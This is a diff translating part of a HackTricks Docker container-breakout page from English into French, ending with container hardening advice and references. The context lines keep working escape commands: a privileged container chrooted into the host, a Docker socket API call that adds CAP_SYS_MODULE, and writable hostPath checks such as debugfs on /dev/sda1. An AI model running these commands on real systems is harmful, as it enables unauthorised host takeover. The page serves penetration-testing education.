@@ -484,11 +439,9 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
+## Attribut JSON non vérifié
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parametter** of the API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS_MODULE** capability:
-
+Il est possible que lorsque l'administrateur système a configuré le pare-feu docker, il ait **oublié un attribut important d'un paramètre de l'API** ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) comme "**Capabilities**" à l'intérieur de "**HostConfig**". Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur avec la capacité **SYS_MODULE** :
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -498,11 +451,9 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
+# Montage hostPath inscriptible
 
-# Writable hostPath Mount
-
-(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
-
+(Info de [**ici**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Dans le conteneur, un attaquant peut tenter d'obtenir un accès supplémentaire au système d'exploitation hôte sous-jacent via un volume hostPath inscriptible créé par le cluster. Voici quelques éléments courants que vous pouvez vérifier dans le conteneur pour voir si vous exploitez ce vecteur d'attaque :
 ```bash
 ### Check if You Can Write to a File-system
 $ echo 1 > /proc/sysrq-trigger
@@ -516,20 +467,19 @@ $ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if n
 ### debugfs (Interactive File System Debugger)
 $ debugfs /dev/sda1
 ```
+# Améliorations de la sécurité des conteneurs
 
-# Containers Security Improvements
+## Seccomp dans Docker
 
-## Seccomp in Docker
-
-This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
+Il ne s'agit pas d'une technique pour s'échapper d'un conteneur Docker, mais d'une fonctionnalité de sécurité que Docker utilise et que vous devriez connaître car elle pourrait vous empêcher de vous échapper de Docker :
 
 {% content-ref url="seccomp.md" %}
 [seccomp.md](seccomp.md)
 {% endcontent-ref %}
 
-## AppArmor in Docker
+## AppArmor dans Docker
 
-This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
+Il ne s'agit pas d'une technique pour s'échapper d'un conteneur Docker, mais d'une fonctionnalité de sécurité que Docker utilise et que vous devriez connaître car elle pourrait vous empêcher de vous échapper de Docker :
 
 {% content-ref url="apparmor.md" %}
 [apparmor.md](apparmor.md)
@@ -537,40 +487,40 @@ This is not a technique to breakout from a Docker container but a security featu
 
 ## AuthZ & AuthN
 
-An authorization plugin **approves** or **denies** **requests** to the Docker **daemon** based on both the current **authentication** context and the **command** **context**. The **authentication** **context** contains all **user details** and the **authentication** **method**. The **command context** contains all the **relevant** **request** data.
+Un plugin d'autorisation **approuve** ou **refuse** les **demandes** au démon Docker en fonction du contexte d'**authentification** actuel et du contexte de **commande**. Le contexte d'**authentification** contient tous les **détails de l'utilisateur** et la **méthode d'authentification**. Le contexte de **commande** contient toutes les données de **demande** **pertinentes**.
 
 {% content-ref url="broken-reference" %}
-[Broken link](broken-reference)
+[Lien cassé](broken-reference)
 {% endcontent-ref %}
 
 ## gVisor
 
-**gVisor** is an application kernel, written in Go, that implements a substantial portion of the Linux system surface. It includes an [Open Container Initiative (OCI)](https://www.opencontainers.org) runtime called `runsc` that provides an **isolation boundary between the application and the host kernel**. The `runsc` runtime integrates with Docker and Kubernetes, making it simple to run sandboxed containers.
+**gVisor** est un noyau d'application, écrit en Go, qui implémente une partie substantielle de la surface du système Linux. Il comprend un runtime [Open Container Initiative (OCI)](https://www.opencontainers.org) appelé `runsc` qui fournit une **frontière d'isolation entre l'application et le noyau hôte**. Le runtime `runsc` s'intègre à Docker et Kubernetes, ce qui permet de lancer facilement des conteneurs sandbox.
 
 {% embed url="https://github.com/google/gvisor" %}
 
 # Kata Containers
 
-**Kata Containers** is an open source community working to build a secure container runtime with lightweight virtual machines that feel and perform like containers, but provide** stronger workload isolation using hardware virtualization** technology as a second layer of defense.
+**Kata Containers** est une communauté open source travaillant à la construction d'un runtime de conteneur sécurisé avec des machines virtuelles légères qui se comportent et fonctionnent comme des conteneurs, mais qui offrent une **isolation de charge de travail plus forte en utilisant la technologie de virtualisation matérielle** comme deuxième couche de défense.
 
 {% embed url="https://katacontainers.io/" %}
 
-## Use containers securely
+## Utiliser les conteneurs en toute sécurité
 
-Docker restricts and limits containers by default. Loosening these restrictions may create security issues, even without the full power of the `--privileged` flag. It is important to acknowledge the impact of each additional permission, and limit permissions overall to the minimum necessary.
+Docker restreint et limite les conteneurs par défaut. Assouplir ces restrictions peut créer des problèmes de sécurité, même sans la pleine puissance du drapeau `--privileged`. Il est important de reconnaître l'impact de chaque permission supplémentaire et de limiter les autorisations globales au minimum nécessaire.
 
-To help keep containers secure:
+Pour aider à maintenir la sécurité des conteneurs :
 
-* Do not use the `--privileged` flag or mount a [Docker socket inside the container](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). The docker socket allows for spawning containers, so it is an easy way to take full control of the host, for example, by running another container with the `--privileged` flag.
-* Do not run as root inside the container. Use a [different user](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) or [user namespaces](https://docs.docker.com/engine/security/userns-remap/). The root in the container is the same as on host unless remapped with user namespaces. It is only lightly restricted by, primarily, Linux namespaces, capabilities, and cgroups.
-* [Drop all capabilities](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) and enable only those that are required (`--cap-add=...`). Many of workloads don’t need any capabilities and adding them increases the scope of a potential attack.
-* [Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) to prevent processes from gaining more privileges, for example through suid binaries.
-* [Limit resources available to the container](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Resource limits can protect the machine from denial of service attacks.
-* Adjust [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (or SELinux) profiles to restrict the actions and syscalls available for the container to the minimum required.
-* Use [official docker images](https://docs.docker.com/docker-hub/official_images/) or build your own based on them. Don’t inherit or use [backdoored](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) images.
-* Regularly rebuild your images to apply security patches. This goes without saying.
+* Ne pas utiliser le drapeau `--privileged` ou monter un [socket Docker à l'intérieur du conteneur](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). Le socket Docker permet de lancer des conteneurs, il est donc facile de prendre le contrôle total de l'hôte, par exemple en exécutant un autre conteneur avec le drapeau `--privileged`.
+* Ne pas exécuter en tant que root à l'intérieur du conteneur. Utiliser un [utilisateur différent](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) ou des [espaces de noms utilisateur](https://docs.docker.com/engine/security/userns-remap/). Le root dans le conteneur est le même que sur l'hôte sauf s'il est remappé avec des espaces de noms utilisateur. Il est seulement légèrement restreint par, principalement, les espaces de noms Linux, les capacités et les cgroups.
+* [Supprimer toutes les capacités](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) et n'activer que celles qui sont nécessaires (`--cap-add=...`). Beaucoup de charges de travail n'ont besoin d'aucune capacité et leur ajout augmente la portée d'une attaque potentielle.
+* [Utiliser l'option de sécurité "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) pour empêcher les processus de gagner plus de privilèges, par exemple via des binaires suid.
+* [Limiter les ressources disponibles pour le conteneur](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Les limites de ressources peuvent protéger la machine contre les attaques de déni de service.
+* Ajuster les profils [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (ou SELinux) pour restreindre les actions et les appels système disponibles pour le conteneur au minimum requis.
+* Utiliser des [images Docker officielles](https://docs.docker.com/docker-hub/official_images/) ou construire les vôtres en vous basant sur elles. Ne pas hériter ou utiliser des images [compromises](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
+* Reconstruire régulièrement vos images pour appliquer les correctifs de sécurité. Cela va sans dire.
 
-# References
+# Références
 
 * [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
 * [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
@@ -581,16 +531,14 @@ To help keep containers secure:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs.
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
